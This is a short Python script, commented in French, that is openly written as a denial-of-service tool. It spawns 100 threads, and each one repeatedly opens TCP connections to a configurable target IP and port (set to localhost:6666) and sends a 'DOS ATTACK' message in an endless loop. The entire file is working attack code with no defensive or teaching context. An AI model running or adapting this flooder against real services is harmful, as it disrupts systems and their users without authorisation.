import socket
import threading
import time

# Configuration de l'attaque DoS
target_ip = "127.0.0.1"  # Adresse IP de la cible
port = 6666  # Port de la cible
num_threads = 100  # Nombre de threads à exécuter en parallèle

# Fonction qui envoie un grand nombre de requêtes au serveur
def dos_attack():
    while True:
        try:
            # Création d'une connexion socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            
            # Envoi d'une requête vide
            sock.send(b"DOS ATTACK\n")
            sock.close()
        except Exception as e:
            print(f"Erreur: {e}")
        
        time.sleep(0.1)  # Petite pause pour ne pas crasher l'attaquant

# Lancement de plusieurs threads pour amplifier l'attaque
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=dos_attack)
    thread.start()
    threads.append(thread)

# Attendre que tous les threads terminent
for thread in threads:
    thread.join()
